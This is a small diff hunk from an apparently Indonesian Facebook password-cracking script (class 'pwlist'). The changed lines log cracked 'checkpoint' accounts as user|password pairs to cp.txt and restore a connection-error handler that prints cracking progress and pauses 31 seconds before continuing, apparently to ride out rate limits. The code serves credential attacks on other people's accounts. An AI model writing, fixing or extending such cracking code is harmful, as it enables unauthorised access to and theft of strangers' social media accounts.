@@ -288,14 +288,13 @@ class pwlist:
           if len(cari)==0:
                 print("\r*--> Teman: 0")
           else:
-                print("\r[coba cek mbasic]"+cari[0])
+                print("\r[coba cek mbasic] "+cari[0])
           cp.append(user)
           with open('cp.txt','a') as x:
             x.write(user+'|'+pw+'\n')
           break
         else:continue
-      #except(requests.exceptions.ConnectionError):print("\r\x1b[1;92mcracking \x1b[1;97m"+str(loop)+"|"+str(len(uid2))+"\x1b[1;92m OK:-"+str(len(ok))+" \x1b[1;93mCP:-"+str(len(cp))+" \x1b[1;97mstatus:\x1b[1;91mFalse\x1b[0m",end="");time.sleep(31)
-      except(Exception) as e:print(e)
+      except(requests.exceptions.ConnectionError):print("\r\x1b[1;92mcracking \x1b[1;97m"+str(loop)+"|"+str(len(uid2))+"\x1b[1;92m OK:-"+str(len(ok))+" \x1b[1;93mCP:-"+str(len(cp))+" \x1b[1;97mstatus:\x1b[1;91mFalse\x1b[0m",end="");time.sleep(31)
     loop+=1
             
 if __name__=="__main__":
